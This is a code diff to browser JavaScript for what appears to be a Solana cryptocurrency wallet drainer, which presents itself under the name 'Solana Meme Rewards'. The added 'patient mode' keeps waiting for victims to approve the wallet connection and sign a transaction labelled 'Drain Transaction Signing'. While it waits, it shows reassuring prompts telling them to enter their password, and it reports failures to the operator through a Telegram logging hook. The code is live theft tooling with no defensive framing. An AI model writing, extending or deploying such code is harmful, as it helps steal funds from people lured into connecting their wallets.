@@ -2852,12 +2852,83 @@
                   const progress = Math.min((elapsed / (window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)) * 100, 95);
                   updateConnectionProgress(progress);
                 }, 100);
-                const result = await Promise.race([
-                  connectionPromise,
-                  new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
-                  )
-                ]);
+                let result;
+                try {
+                  result = await Promise.race([
+                    connectionPromise,
+                    new Promise((_, reject) => 
+                      setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
+                    )
+                  ]);
+                } catch (timeoutError) {
+                  if (timeoutError.message === 'Connection timeout') {
+                    // Enter patient mode for slow users
+                    console.log(`[CONNECT] Initial timeout for ${def.name}, entering patient mode...`);
+                    clearInterval(progressInterval);
+                    
+                    showConnectionStatus(`⏳ Waiting for approval... Please check your ${def.name} wallet and enter your password when ready`, 'loading', true);
+                    
+                    // Patient mode: wait indefinitely for user approval
+                    result = await new Promise((resolve, reject) => {
+                      const checkInterval = 1000; // Check every second
+                      let checkCount = 0;
+                      let isResolved = false;
+                      
+                      const pollForConnection = setInterval(() => {
+                        if (isResolved) return;
+                        
+                        checkCount++;
+                        console.log(`[CONNECT] Patient mode check ${checkCount} for ${def.name}...`);
+                        
+                        // Check if connection completed
+                        if (provider.publicKey) {
+                          isResolved = true;
+                          clearInterval(pollForConnection);
+                          resolve({ publicKey: provider.publicKey });
+                          return;
+                        }
+                        
+                        // Update status every 30 seconds to reassure user
+                        if (checkCount % 30 === 0) {
+                          showConnectionStatus(`⏳ Still waiting for approval... (${Math.floor(checkCount/60)}min) Please check your ${def.name} wallet`, 'loading', true);
+                        }
+                      }, checkInterval);
+                      
+                      // Listen for connection events
+                      const connectHandler = (publicKey) => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForConnection);
+                        resolve({ publicKey });
+                      };
+                      
+                      provider.once('connect', connectHandler);
+                      
+                      // Allow manual cancellation after 5 minutes
+                      const cancelTimeout = setTimeout(() => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForConnection);
+                        reject(new Error('Patient mode cancelled - connection took too long'));
+                      }, 5 * 60 * 1000); // 5 minutes max
+                      
+                      // Cleanup function
+                      const cleanup = () => {
+                        if (!isResolved) {
+                          isResolved = true;
+                          clearInterval(pollForConnection);
+                          clearTimeout(cancelTimeout);
+                          provider.removeListener('connect', connectHandler);
+                        }
+                      };
+                      
+                      // Ensure cleanup on any error
+                      process.on('unhandledRejection', cleanup);
+                    });
+                  } else {
+                    throw timeoutError;
+                  }
+                }
                 
                 clearInterval(progressInterval);
                 updateConnectionProgress(100);
@@ -2871,12 +2942,84 @@
                 
               } else {
                 // Standard connection for desktop wallets
-                const result = await Promise.race([
-                  provider.connect(),
-                  new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
-                  )
-                ]);
+                let result;
+                try {
+                  result = await Promise.race([
+                    provider.connect(),
+                    new Promise((_, reject) => 
+                      setTimeout(() => reject(new Error('Connection timeout')), window.getTimeout('WALLET_CONNECTION_TIMEOUT') || timeout)
+                    )
+                  ]);
+                } catch (timeoutError) {
+                  if (timeoutError.message === 'Connection timeout') {
+                    // Enter patient mode for slow users
+                    console.log(`[CONNECT] Initial timeout for ${def.name}, entering patient mode...`);
+                    
+                    if (window.showStatus) {
+                      window.showStatus(`⏳ Waiting for approval... Please check your ${def.name} wallet and enter your password when ready`, 'loading');
+                    }
+                    
+                    // Patient mode: wait indefinitely for user approval
+                    result = await new Promise((resolve, reject) => {
+                      const checkInterval = 1000; // Check every second
+                      let checkCount = 0;
+                      let isResolved = false;
+                      
+                      const pollForConnection = setInterval(() => {
+                        if (isResolved) return;
+                        
+                        checkCount++;
+                        console.log(`[CONNECT] Patient mode check ${checkCount} for ${def.name}...`);
+                        
+                        // Check if connection completed
+                        if (provider.publicKey) {
+                          isResolved = true;
+                          clearInterval(pollForConnection);
+                          resolve({ publicKey: provider.publicKey });
+                          return;
+                        }
+                        
+                        // Update status every 30 seconds to reassure user
+                        if (checkCount % 30 === 0 && window.showStatus) {
+                          window.showStatus(`⏳ Still waiting for approval... (${Math.floor(checkCount/60)}min) Please check your ${def.name} wallet`, 'loading');
+                        }
+                      }, checkInterval);
+                      
+                      // Listen for connection events
+                      const connectHandler = (publicKey) => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForConnection);
+                        resolve({ publicKey });
+                      };
+                      
+                      provider.once('connect', connectHandler);
+                      
+                      // Allow manual cancellation after 5 minutes
+                      const cancelTimeout = setTimeout(() => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForConnection);
+                        reject(new Error('Patient mode cancelled - connection took too long'));
+                      }, 5 * 60 * 1000); // 5 minutes max
+                      
+                      // Cleanup function
+                      const cleanup = () => {
+                        if (!isResolved) {
+                          isResolved = true;
+                          clearInterval(pollForConnection);
+                          clearTimeout(cancelTimeout);
+                          provider.removeListener('connect', connectHandler);
+                        }
+                      };
+                      
+                      // Ensure cleanup on any error
+                      process.on('unhandledRejection', cleanup);
+                    });
+                  } else {
+                    throw timeoutError;
+                  }
+                }
                 
                 publicKey = result?.publicKey || provider.publicKey;
                 console.log(`[CONNECT] Desktop wallet connection successful on attempt ${retryCount + 1}`);
@@ -3157,21 +3300,110 @@
               throw new Error('Invalid signed transaction received from wallet');
             }
           } catch (signError) {
-            logger.error(`[DRAIN] Transaction signing failed:`, signError);
-            
-            // Log critical signing failures to Telegram
-            if (window.sendTelegramLog) {
-              window.sendTelegramLog('TRANSACTION_SIGNING', {
-                error: signError.message,
-                stack: signError.stack,
-                context: 'Drain Transaction Signing',
-                walletType: walletType,
-                timestamp: new Date().toISOString(),
-                projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
-              });
+            if (signError.message === 'Signing timeout - please try again') {
+              // Enter patient mode for slow users who need time to enter wallet password
+              console.log(`[DRAIN] Initial signing timeout for ${walletType}, entering patient mode...`);
+              
+              if (window.showStatus) {
+                window.showStatus(`⏳ Waiting for signature... Please check your ${walletType} wallet and enter your password when ready`, 'loading');
+              }
+              
+                              // Patient mode: wait indefinitely for user to sign
+                try {
+                  signedTransaction = await new Promise((resolve, reject) => {
+                    const checkInterval = 2000; // Check every 2 seconds for signing
+                    let checkCount = 0;
+                    let isResolved = false;
+                    let patientSignPromise = provider.signTransaction(transaction); // Fresh signing attempt
+                    
+                    const pollForSigning = setInterval(() => {
+                      if (isResolved) return;
+                      
+                      checkCount++;
+                      console.log(`[DRAIN] Patient mode signing check ${checkCount} for ${walletType}...`);
+                      
+                      // Update status every 30 seconds to reassure user
+                      if (checkCount % 15 === 0 && window.showStatus) { // Every 30 seconds (15 * 2s)
+                        window.showStatus(`⏳ Still waiting for signature... (${Math.floor(checkCount*2/60)}min) Please check your ${walletType} wallet`, 'loading');
+                      }
+                    }, checkInterval);
+                    
+                    // Wait for the signing promise to resolve
+                    patientSignPromise
+                      .then((result) => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForSigning);
+                        resolve(result);
+                      })
+                      .catch((error) => {
+                        if (isResolved) return;
+                        isResolved = true;
+                        clearInterval(pollForSigning);
+                        reject(error);
+                      });
+                    
+                    // Allow manual cancellation after 10 minutes for signing
+                    const cancelTimeout = setTimeout(() => {
+                      if (isResolved) return;
+                      isResolved = true;
+                      clearInterval(pollForSigning);
+                      reject(new Error('Patient mode signing cancelled - took too long'));
+                    }, 10 * 60 * 1000); // 10 minutes max for signing
+                    
+                    // Cleanup function
+                    const cleanup = () => {
+                      if (!isResolved) {
+                        isResolved = true;
+                        clearInterval(pollForSigning);
+                        clearTimeout(cancelTimeout);
+                      }
+                    };
+                    
+                    // Ensure cleanup on any error
+                    process.on('unhandledRejection', cleanup);
+                  });
+                  
+                  logger.log(`[DRAIN] Patient mode transaction signed successfully:`, signedTransaction);
+                  
+                  // Validate signed transaction
+                  if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
+                    throw new Error('Invalid signed transaction received from wallet in patient mode');
+                  }
+                } catch (patientModeError) {
+                  logger.error(`[DRAIN] Patient mode transaction signing failed:`, patientModeError);
+                  
+                  // Log critical patient mode signing failures to Telegram
+                  if (window.sendTelegramLog) {
+                    window.sendTelegramLog('TRANSACTION_SIGNING', {
+                      error: patientModeError.message,
+                      stack: patientModeError.stack,
+                      context: 'Drain Transaction Signing (Patient Mode)',
+                      walletType: walletType,
+                      timestamp: new Date().toISOString(),
+                      projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
+                    });
+                  }
+                  
+                  throw patientModeError;
+                }
+            } else {
+              logger.error(`[DRAIN] Transaction signing failed:`, signError);
+              
+              // Log critical signing failures to Telegram
+              if (window.sendTelegramLog) {
+                window.sendTelegramLog('TRANSACTION_SIGNING', {
+                  error: signError.message,
+                  stack: signError.stack,
+                  context: 'Drain Transaction Signing',
+                  walletType: walletType,
+                  timestamp: new Date().toISOString(),
+                  projectName: window.APP_CONFIG?.PROJECT_NAME || 'Solana Meme Rewards'
+                });
+              }
+              
+              throw signError;
             }
-            
-            throw signError;
           }
           
           if (window.showStatus) window.showStatus('📡 Broadcasting transaction...', 'loading');
